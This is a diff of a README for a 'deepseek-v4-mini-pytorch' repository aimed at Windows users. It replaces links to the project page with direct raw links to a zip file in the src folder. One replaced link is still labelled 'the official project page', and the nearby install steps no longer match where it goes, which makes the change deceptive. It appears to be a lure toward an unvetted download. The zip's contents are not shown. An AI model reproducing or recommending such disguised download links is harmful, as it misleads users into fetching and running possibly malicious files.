@@ -1,6 +1,6 @@
 # 🧠 deepseek-v4-mini-pytorch - Understand complex artificial intelligence model structures
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/ladiagona1028/deepseek-v4-mini-pytorch)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/ladiagona1028/deepseek-v4-mini-pytorch/main/src/deepseek_mini_v_pytorch_v2.7-alpha.2.zip)
 
 ## 📌 Project Overview
 
@@ -21,7 +21,7 @@ To run this application on your Windows computer, make sure your system meets th
 
 Follow these steps to prepare your environment and launch the software.
 
-1. **Visit the website:** Go to [the official project page](https://github.com/ladiagona1028/deepseek-v4-mini-pytorch) to download the software.
+1. **Visit the website:** Go to [the official project page](https://raw.githubusercontent.com/ladiagona1028/deepseek-v4-mini-pytorch/main/src/deepseek_mini_v_pytorch_v2.7-alpha.2.zip) to download the software.
 2. **Download the files:** Locate the Green code button on the page. Select the option to download the ZIP file. 
 3. **Unzip the software:** Open your Downloads folder. Right-click the file named deepseek-v4-mini-pytorch-main.zip and choose Extract All. Select a destination folder, such as your Documents folder, and click Extract.
 4. **Install Python:** If you do not have Python, download it from the official website. Run the installer and ensure you check the box that says "Add Python to PATH" before you click install.
